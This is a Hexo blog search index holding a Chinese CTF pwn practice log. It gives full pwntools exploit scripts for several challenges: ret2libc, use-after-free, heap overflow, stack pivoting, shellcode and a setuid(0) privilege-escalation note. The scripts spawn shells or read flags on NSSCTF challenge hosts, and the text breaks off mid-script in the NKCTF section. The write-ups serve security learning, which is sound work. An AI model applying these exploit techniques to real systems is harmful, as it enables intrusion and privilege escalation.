<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>刷题记录</title>
      <link href="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="刷题记录"><a href="#刷题记录" class="headerlink" title="刷题记录"></a>刷题记录</h1><h2 id="SWPUCTF-2022-新生赛-Integer-Overflow"><a href="#SWPUCTF-2022-新生赛-Integer-Overflow" class="headerlink" title="[SWPUCTF 2022 新生赛]Integer Overflow"></a>[SWPUCTF 2022 新生赛]Integer Overflow</h2><p>一道普通的libc,但是需要注意不能使用elf.sym来寻找system的地址，因为<code>endbr32</code>会保护plt表</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DInteger%20Overflow.1.png"></p><p>所以我们顺着程序逻辑走之后栈溢出即可</p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level='debug',arch='i386', os='linux')</span><br><span class="line"></span><br><span class="line">p = remote('node5.anna.nssctf.cn',28462 )</span><br><span class="line"></span><br><span class="line">elf = ELF('./pwn')</span><br><span class="line"></span><br><span class="line">system = 0x08049104</span><br><span class="line">sh= 0x804a008</span><br><span class="line"></span><br><span class="line">p.sendlineafter('Tell me your choice:','1')</span><br><span class="line">p.sendlineafter('First input the length of your name:','-1')</span><br><span class="line"></span><br><span class="line">payload = flat([b'a'* (0x20 + 0x4) , system , 1, sh])</span><br><span class="line">p.sendlineafter(b"name?",payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="NISACTF-2022-UAF"><a href="#NISACTF-2022-UAF" class="headerlink" title="[NISACTF 2022]UAF"></a>[NISACTF 2022]UAF</h2><p>(第一次尝试uaf题)</p><h3 id="uaf原理"><a href="#uaf原理" class="headerlink" title="uaf原理"></a>uaf原理</h3><p>user-after-free漏洞是因为没有合理使用动态内存，在数据已经被删除或移动后原先的指针还被保留。指针本质上是内存地址和数据的一种对应关系，如果只处理了数据但是没有处理这种对应关系的话，就像你家被盗是因为上一个主人走后没换锁，别人拿着老的那把锁还能开你家的门。</p><p>程序的动态内存设计heap(堆)，可以在一定范围内分配大量数据并且相对来说比较自由，可以修改、释放或者再程序的其他部分自由使用。当然在使用中要动态查找哪一个部分是有空缺的。</p><p>``</p><p>先看代码逻辑，应该是最简单的uaf了，只需要完成四个步骤然后找到<code>NICO</code>即可</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.1.png"><br><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.2.png"><br><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.3.png"><br><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF4.png"><br><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.5.png"><br><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.6.png"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os='linux', arch='i386', log_level='debug')</span><br><span class="line"></span><br><span class="line"># p = process(['./pwn'])</span><br><span class="line">p = remote('node4.anna.nssctf.cn', 28004)</span><br><span class="line">elf = ELF('./pwn')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_page():</span><br><span class="line">    p.sendlineafter(b':', b'1')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete_page(index):</span><br><span class="line">    p.sendlineafter(b':', b'3')</span><br><span class="line">    p.sendlineafter(b'Input page\n', str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit_page(index, content):</span><br><span class="line">    p.sendlineafter(b':', b'2')</span><br><span class="line">    p.sendlineafter(b'Input page\n', str(index))</span><br><span class="line">    p.sendlineafter(b'Input your strings\n', content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_page(index):</span><br><span class="line">    p.sendlineafter(b':', b'4')</span><br><span class="line">    p.sendlineafter(b'Input page\n', str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># create page 0</span><br><span class="line">create_page()</span><br><span class="line"></span><br><span class="line"># delete page 0</span><br><span class="line">delete_page(0) </span><br><span class="line"></span><br><span class="line"># create page 1</span><br><span class="line">create_page()</span><br><span class="line"></span><br><span class="line"># edit page -&gt; uaf</span><br><span class="line">payload = flat(['sh\x00\x00', elf.sym['NICO']])</span><br><span class="line">edit_page(1, payload)</span><br><span class="line"></span><br><span class="line"># show page 0</span><br><span class="line">show_page(0)</span><br><span class="line"># 利用 show 功能 get_shell 的时候只能使用索引为 0 的堆块，而 edit 不能编辑索引为 0 的堆块，所以就要用到 UAF 了</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.7.png"></p><h2 id="CISCN-华南-PWN4"><a href="#CISCN-华南-PWN4" class="headerlink" title="CISCN 华南 PWN4"></a>CISCN 华南 PWN4</h2><p>本题为32位栈迁移</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CISCN%20%E5%8D%8E%E5%8D%97%20PWN4.1.png"></p><p>看到<code>read</code>和<code>printf</code>想到格式化字符串漏洞</p><p>因为是32位程序，用栈传递参数，所以找到esp位置，传入system的地址和/bin/sh后再从栈上退回即可实现提权</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os='linux',arch='amd64',log_level='debug')</span><br><span class="line">p=remote('node5.anna.nssctf.cn',28355)</span><br><span class="line"></span><br><span class="line">elf=ELF('./pwn2')</span><br><span class="line">system_addr=elf.sym['system']</span><br><span class="line">leave_addr=0x80485FD</span><br><span class="line"></span><br><span class="line">payload1 = b'a'*0x27</span><br><span class="line">p.sendlineafter('name?\n',payload1)</span><br><span class="line">p.recvuntil('\n')</span><br><span class="line">esp = u32(p.recv(4))-0x38</span><br><span class="line"></span><br><span class="line">payload2 = b'a'*4+p32(system_addr)+p32(0)+p32(esp+0x10)+b'/bin/sh'</span><br><span class="line">payload2 = payload2.ljust(0x28,b'\0')</span><br><span class="line">payload2+=p32(esp)+p32(leave_addr)</span><br><span class="line">p.sendlineafter('\n',payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CISCN%20%E5%8D%8E%E5%8D%97%20PWN4.2.png"></p><h2 id="HGAME-2023-week1-simple-shellcode"><a href="#HGAME-2023-week1-simple-shellcode" class="headerlink" title="[HGAME 2023 week1]simple_shellcode"></a>[HGAME 2023 week1]simple_shellcode</h2><p>打开ida可以发现<code>MEMORY[0xCAFE0000]</code>,根据hint调用read来读取flag,而<code>read</code>的范围比较小，手动扩大范围即可</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BHGAME%202023%20week1%5Dsimple_shellcode.2.jpg"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os='linux', arch='amd64', log_level='debug')</span><br><span class="line">p=remote('node5.anna.nssctf.cn',28430)</span><br><span class="line">#p=process("./shellcode")</span><br><span class="line">p.recvuntil("shellcode:\n")</span><br><span class="line"> </span><br><span class="line">mmap_addr =0xcafe0000</span><br><span class="line"> </span><br><span class="line">shellcode=shellcraft.open("./flag")</span><br><span class="line">shellcode+=shellcraft.read(3,mmap_addr+0x100,0x50)</span><br><span class="line">shellcode+=shellcraft.write(1,mmap_addr+0x100,0x50)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"> </span><br><span class="line">p.send(asm("xor rdi,rdi;mov rsi,0xcafe000f;syscall;"))</span><br><span class="line"></span><br><span class="line"># 将rdi置零后把read的调用放里面</span><br><span class="line"></span><br><span class="line">#print(len(asm("xor rdi,rdi;mov rsi,0xcafe000f;syscall;")))</span><br><span class="line"></span><br><span class="line">#查看扩展的范围是否足够</span><br><span class="line"> </span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BHGAME%202023%20week1%5Dsimple_shellcode.1.jpg"></p><h2 id="NISACTF-2022-ezheap"><a href="#NISACTF-2022-ezheap" class="headerlink" title="[NISACTF 2022]ezheap"></a>[NISACTF 2022]ezheap</h2><p>首先代码看一下，就是简单的malloc个heap空间，直接分配堆空间然后堆溢出即可</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.2.jpg"></p><p>先随便输入一些数据，然后gdb调试一下发现heap是0x20，但是我们申请的是0x16，这是为什么呢？这是因为malloc_chunk要求chunk大小必须是 2 * SIZE_SZ 的整数倍，如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。而在32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。题目程序为32位，我们申请了0x16(22)个字节，再加上chunk header（也就是prev_size和size）的4<em>2=8个字节，一共22+8=30个字节，不是2</em>4=8的倍数，所以补齐到32个字节，也就是0x20</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.1.jpg"></p><p>附图：</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.3.png"></p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.4.jpg"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level="debug",arch="amd64")</span><br><span class="line"># p = remote("node4.anna.nssctf.cn",28184)</span><br><span class="line">p = process("./../pwn")</span><br><span class="line">elf = ELF("./../pwn")</span><br><span class="line"></span><br><span class="line">p.recvuntil("Input:\n")</span><br><span class="line">#0x20为整个chunk的大小，减去0x8（也就是prev_size和size）就是剩下的userdata，加上0x8（也就是下一个chunk的prev_size和size），这样就到达了下一个chunk的userdata部分，输入命令就行了。</span><br><span class="line">payload = b'A' * (0x20-0x8 + 0x8) + b'/bin/sh'  </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="HNCTF-2022-WEEK4-ezheap"><a href="#HNCTF-2022-WEEK4-ezheap" class="headerlink" title="[HNCTF 2022 WEEK4]ezheap"></a>[HNCTF 2022 WEEK4]ezheap</h2><p>是一道heap的模板题，通过adse几个功能实现对堆上的操作</p><p>因为程序中有puts函数，泄露出函数的偏移和基地址，再去使用libc库中的system函数实现提权，获取shell</p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os='linux',arch='amd64',log_level='debug')</span><br><span class="line"></span><br><span class="line">#p = process('./pwn')</span><br><span class="line">p = remote("node5.anna.nssctf.cn",28668)</span><br><span class="line"></span><br><span class="line">elf = ELF('./pwn')</span><br><span class="line">libc = ELF('./libc-2.23.so')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def lg(x, y): return log.success(f'{x}: {hex(y)}')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def choice(index):</span><br><span class="line">    p.sendlineafter(b'Choice: \n', str(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(index, size, name, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    p.sendlineafter(b'idx:\n', str(index).encode())</span><br><span class="line">    p.sendlineafter(b'Size:\n', str(size).encode())</span><br><span class="line">    p.sendlineafter(b'Name: \n', name)</span><br><span class="line">    p.sendlineafter(b'Content:\n', content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(index, size, data):</span><br><span class="line">    choice(4)</span><br><span class="line">    p.sendlineafter(b'idx:\n', str(index).encode())</span><br><span class="line">    p.sendlineafter(b'Size:\n', str(size).encode())</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    choice(2)</span><br><span class="line">    p.sendlineafter(b'idx:\n', str(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    choice(3)</span><br><span class="line">    p.sendlineafter(b'idx:\n', str(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0, 0x10, b'00000000', b'AAAAAAAA')</span><br><span class="line">add(1, 0x10, b'11111111', b'BBBBBBBB')</span><br><span class="line">payload = b"CCCCCCCC"*8</span><br><span class="line"></span><br><span class="line">edit(0, 0x40, payload)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(b"CCCCCCCC"*8)</span><br><span class="line">puts_addr = u64(p.recvuntil(b"\x7f").ljust(8,b"\x00"))</span><br><span class="line">lg("puts_addr: ", puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym['puts']</span><br><span class="line">binsh = libc_base + libc.search(b'/bin/sh').__next__()</span><br><span class="line">system = libc_base + libc.sym['system']</span><br><span class="line">lg("binsh: ", binsh)</span><br><span class="line">lg("system: ", system)</span><br><span class="line"></span><br><span class="line">payload = b"DDDDDDDD"*4</span><br><span class="line">payload += b"/bin/sh\x00"</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += b"DDDDDDDD"*2</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(0)</span><br><span class="line"></span><br><span class="line">edit(0, 0x60, payload)</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BHNCTF%202022%20WEEK4%5Dezheap.1.png"></p><h2 id="LACTF-2024-sus"><a href="#LACTF-2024-sus" class="headerlink" title="LACTF 2024 sus"></a>LACTF 2024 sus</h2><p>一道libc题，找出偏移量之后泄露puts地址，然后算基地址偏移，找system函数和/bin/sh字串位置(压缩包里的libc库有点问题，自己找了个2.35的换一下)</p><p>无法直接传参进入rdi，找个汇编片段间接传参</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LACTF%20sus.2.png"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os="linux", arch="amd64", log_level="debug")</span><br><span class="line"></span><br><span class="line">p = process('./sus')</span><br><span class="line">elf = ELF('./sus')</span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line"></span><br><span class="line">puts_plt = 0x401030</span><br><span class="line">puts_got = 0x404000</span><br><span class="line">main_addr = 0x401151</span><br><span class="line">pop_rdi_ret = 0x401190</span><br><span class="line">ret = 0x401016</span><br><span class="line"></span><br><span class="line">payload = b'a'*56 + p64(puts_got) + p64(0) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter("sus?\n",payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols['puts']</span><br><span class="line">system_addr = libc_base + libc.symbols['system']</span><br><span class="line">bin_addr = libc_base + next(libc.search(b'/bin/sh'))</span><br><span class="line"></span><br><span class="line">print("base = ",hex(libc_base))</span><br><span class="line">print("sys = ",hex(system_addr))</span><br><span class="line">print("bin = ",hex(bin_addr))</span><br><span class="line"></span><br><span class="line">payload = b'b'*56 + p64(bin_addr) + p64(0) + p64(ret)+ p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LACTF%20sus.1.png"></p><h2 id="LitCTF-2023-狠狠的溢出涅"><a href="#LitCTF-2023-狠狠的溢出涅" class="headerlink" title="[LitCTF 2023]狠狠的溢出涅~"></a>[LitCTF 2023]狠狠的溢出涅~</h2><p>一道ret2libc模板题，只需要泄露puts函数的got表后找偏移，ropgadget找个ret，剩下的都在链接库里，比较简单</p><p>只需要注意一下strlen函数的<code>\x00</code>绕过即可</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BLitCTF%202023%5D%E7%8B%A0%E7%8B%A0%E7%9A%84%E6%BA%A2%E5%87%BA%E6%B6%85~.2.png"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="amd64", log_level="debug")</span><br><span class="line">#p = process('./pwn')</span><br><span class="line">p = remote('node4.anna.nssctf.cn',28190)</span><br><span class="line">elf = ELF('./pwn')</span><br><span class="line">libc = ELF('./libc-2.31.so')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4007d3 </span><br><span class="line">puts_got = elf.got['puts']</span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">ret_addr = 0x400556 </span><br><span class="line">main_add = elf.sym['main']</span><br><span class="line"></span><br><span class="line">#b"\x00".ljust(0x68,b'a')</span><br><span class="line"></span><br><span class="line">payload1 = b'\x00'*(0x60+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_add)</span><br><span class="line"></span><br><span class="line">p.sendlineafter("message:\n",payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym["puts"]</span><br><span class="line">system = libc_base + libc.symbols['system']</span><br><span class="line">binsh = libc_base+next(libc.search(b"/bin/sh\x00"))</span><br><span class="line"></span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">print(hex(system))</span><br><span class="line">print(hex(binsh))</span><br><span class="line">payload2 = b'\x00'*(0x60+8) + p64(ret_addr) + p64(pop_rdi_ret) +p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter('message:\n',payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BLitCTF%202023%5D%E7%8B%A0%E7%8B%A0%E7%9A%84%E6%BA%A2%E5%87%BA%E6%B6%85~.1.png"></p><h2 id="NISACTF-2022-Hacknote"><a href="#NISACTF-2022-Hacknote" class="headerlink" title="[NISACTF 2022]Hacknote"></a>[NISACTF 2022]Hacknote</h2><p>因为free掉note和content之后，没有将指针置空，所以导致了UAF漏洞</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DHacknote.2.png"></p><p>由于LIFO原则，也就是后进先出，我们这次申请到的第一个note_chunk_2，其实是上次的note_chunk_1，而content_chunk_2，实际上是上一次的note_chunk_0，通过content_chunk_2的content，我们可以写入我们需要执行的命令，magic函数</p><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DHacknote.3.png"></p><p>content也就是magic函数的地址,覆盖print_note_content函数的指针，成功劫持了程序控制流</p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="i386", log_level="debug")</span><br><span class="line"></span><br><span class="line">p = process('./pwn')</span><br><span class="line"></span><br><span class="line">def add(size_c, content):</span><br><span class="line">    p.recvuntil(b'choice :')</span><br><span class="line">    p.sendline(b'1')</span><br><span class="line">    p.recvuntil(b'size :')</span><br><span class="line">    p.sendline(str(size_c))</span><br><span class="line">    p.recvuntil(b'Content :')</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def free(index):</span><br><span class="line">    p.recvuntil(b'choice :')</span><br><span class="line">    p.sendline(b'2')</span><br><span class="line">    p.recvuntil(b'Index :')</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def print(index):</span><br><span class="line">    p.recvuntil(b'choice :')</span><br><span class="line">    p.sendline(b'3')</span><br><span class="line">    p.recvuntil(b'Index :')</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"> </span><br><span class="line">magic_addr = 0x8048945</span><br><span class="line"> </span><br><span class="line">add(16, b'aaaaaa')</span><br><span class="line">add(16, b'aaaaaa')</span><br><span class="line"> </span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"> </span><br><span class="line">add(8, p32(magic_addr))</span><br><span class="line">print(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DHacknote.1.png"></p><h2 id="NKCTF-2024-maimai"><a href="#NKCTF-2024-maimai" class="headerlink" title="[NKCTF 2024] maimai"></a>[NKCTF 2024] maimai</h2><p>一道难度中等的栈溢出题目。有两个漏洞，一个是符合分数要求的格式化字符串漏洞来泄露<code>libc</code>和<code>canary</code>，另一个是read函数的栈溢出</p><p>需要注意一下，本地打通之后在远端并不能拿到root权限,只是一个低权限shell，<code>ls -al</code>之后看到pwn程序有s权限，这时候可以找到setuid权限，可以在ROP链中加入setuid(0)即可提权。或者第二种方法orw做题(做出来第二种方法再更)</p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 